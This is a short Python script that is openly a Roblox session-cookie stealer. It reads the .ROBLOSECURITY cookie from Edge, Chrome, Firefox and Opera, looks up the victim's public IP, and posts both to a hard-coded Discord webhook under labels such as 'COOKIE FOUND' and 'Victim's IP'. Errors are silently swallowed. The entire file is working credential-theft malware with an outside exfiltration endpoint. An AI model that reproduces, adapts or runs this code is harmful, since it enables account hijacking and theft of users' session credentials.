import browser_cookie3
import requests 
import threading


WebHook = "https://discord.com/api/webhooks/1183893169667047584/IN_H2K0bYxP7fycyhcha0T337bXlMReIEWkcrQ3T-fNsN5IBvtLFkUEsWSH8xvR7SC8y" # Input your webhook here


def MicrosoftEdge():
    
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Edge", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass
        

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Chrome", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Firefox", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Opera", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()

